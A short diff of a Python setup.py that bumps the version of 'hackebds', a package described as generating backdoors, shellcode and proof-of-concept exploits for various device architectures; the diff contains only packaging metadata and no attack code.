@@ -1,15 +1,15 @@
 from setuptools import setup
 
 with open("./README.rst",'r') as f:
 	data= f.read()
 
 
 setup(name='hackebds',
-      version='0.3.6',
+      version='0.3.7',
       description='This tool is used for backdoor,shellcode generation,Information retrieval and POC generation for various architecture devices',
       long_description=data,
       url='https://github.com/doudoudedi/hackEmbedded',
       author='doudoudedi',
       author_email='doudoudedi233@gmail.com',
       license='GPL-3.0',
       install_requires=[
```

